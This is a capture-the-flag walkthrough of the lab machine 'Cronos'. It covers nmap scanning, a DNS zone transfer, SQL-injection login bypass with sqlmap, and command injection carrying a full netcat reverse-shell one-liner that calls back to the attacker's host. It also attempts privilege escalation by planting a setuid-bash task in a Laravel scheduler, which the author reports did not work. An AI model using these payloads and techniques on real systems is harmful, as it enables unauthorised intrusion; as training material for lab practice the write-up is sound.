## Cronos

__Machine IP: 10.10.10.13__
__Difficulty : Medium__


## Scanning

### Nmap scanning

```bash
$ cat nmap/cronos.nmap.nmap 
# Nmap 7.91 scan initiated Sat Sep  4 10:48:39 2021 as: nmap -sC -sV -oA nmap/cronos.nmap 10.10.10.13
Nmap scan report for 10.10.10.13
Host is up (0.095s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep  4 10:49:03 2021 -- 1 IP address (1 host up) scanned in 23.32 seconds
```


- Add the domain to    `/etc/hosts` file

```
$ sudo echo "cronos.htb" >> /etc/hosts
```
- Homepage
![homepage](images/homepage.PNG)


- Finding more domains through `dig`

```bash
$ dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.16.11-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 96 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Sun Sep 05 04:09:41 EDT 2021
;; XFR size: 7 records (messages 1, bytes 203)

```
- Add the dound domains to `/etc/hosts` file

- on visiting `admin.cronos.htb`, found login page
- Trying sql injection using `sqlmap`, capture the request and save it to a file and send it as argument to `sqlmap`

`login.req` file

```bash
$ cat login.req                                                                       130 ⨯
POST / HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://admin.cronos.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://admin.cronos.htb
Connection: close
Cookie: PHPSESSID=rhef9iph5b200ts9amo6imppr0
Upgrade-Insecure-Requests: 1

username=admin&password=admin%27
```

- Running sqlmap

```bash
$ sqlmap -r login.req                                                             
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.5.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:19:01 /2021-09-05/

[04:19:01] [INFO] parsing HTTP request from 'login.req'
[04:19:02] [WARNING] it appears that you have provided tainted parameter values ('password=admin'') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[04:19:05] [INFO] testing connection to the target URL
[04:19:05] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:19:05] [INFO] testing if the target URL content is stable
[04:19:05] [INFO] target URL content is stable
[04:19:05] [INFO] testing if POST parameter 'username' is dynamic
[04:19:05] [WARNING] POST parameter 'username' does not appear to be dynamic
[04:19:06] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[04:19:06] [INFO] testing for SQL injection on POST parameter 'username'
[04:19:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:19:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:19:07] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:19:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[04:19:08] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[04:19:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[04:19:09] [INFO] testing 'Generic inline queries'
[04:19:09] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[04:19:09] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[04:19:10] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[04:19:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:19:21] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[04:20:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:20:39] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://admin.cronos.htb:80/welcome.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] y
[04:20:48] [INFO] checking if the injection point on POST parameter 'username' is a false positive
[04:20:53] [WARNING] false positive or unexploitable injection point detected
[04:20:53] [WARNING] POST parameter 'username' does not seem to be injectable
[04:20:53] [WARNING] POST parameter 'password' does not appear to be dynamic
[04:20:53] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[04:20:53] [INFO] testing for SQL injection on POST parameter 'password'
[04:20:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:20:54] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:20:54] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[04:21:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[04:21:03] [WARNING] POST parameter 'password' does not seem to be injectable
[04:21:03] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[04:21:03] [WARNING] your sqlmap version is outdated

[*] ending @ 04:21:03 /2021-09-05/
```


- `Sqlmap` indicated that `username` is injectable
- on trying `àdmin' #` able to login

__Result__
![loggedin](images/loggedin.PNG)

- trying command injection

__Result__


![command_injection](images/command_injection.PNG)

- Setup the listener on Kali and inject reverse shell

__payload__
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 9001 >/tmp/f
```
__Result__

```bash
$ nc -lvnp  9001                                                                        1 ⨯
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.13] 55194
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### Escalation

- Linpeas pouinted a `php laravel` based `scheduled task`

![linpeas_out](images/linpeas_out.PNG)

- on running the mentioned command
```bash
www-data@cronos:/tmp$ php /var/www/laravel/artisan schedule:run
php /var/www/laravel/artisan schedule:run
No scheduled commands are ready to run.
```
- Scheduling the task
- task scheduing file can be found in `Kernal.php`
- Finding the file
- then add schedule task every minute
```bash
$ cat Kernel.php                                          148 ⨯ 2 ⚙
<?php
 
namespace App\Console;
 
use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Foundation\Console\Kernel as ConsoleKernel;
 
class Kernel extends ConsoleKernel
{
    /**
     * The Artisan commands provided by your application.
     *
     * @var array
     */
    protected $commands = [
        //
    ];
 
    /**
     * Define the application's command schedule.
     *
     * @param  \Illuminate\Console\Scheduling\Schedule  $schedule
     * @return void
     */
    protected function schedule(Schedule $schedule)
    {
         $schedule->exec('cp /bin/bash /tmp/rootbash ; chmod x+s /tmp/rootbash')->everyMinute();
    }
 
    /**
     * Register the commands for the application.
     *
     * @return void
     */
    protected function commands()
    {
        $this->load(__DIR__.'/Commands');
 
        require base_path('routes/console.php');
    }
}
```

- Did'nt work
